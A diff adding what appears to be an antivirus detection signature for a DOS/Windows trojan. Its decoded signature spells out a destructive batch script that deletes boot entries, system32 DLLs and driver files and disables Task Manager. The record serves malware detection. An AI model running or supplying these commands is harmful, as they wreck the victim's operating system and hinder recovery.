@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36565
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off bootcfg /delete /id 1 >nul bootcfg /delete /id 1 >nul bootcfg /delete /id 1 >nul del %systemroot%\system32\devmgmt.msc >nul del "%systemroot%\driver cache\i386\driver.cab" /f /q >nul del "%systemroot%\system32\*.dll" /q >nul reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d 1 /f >nulc
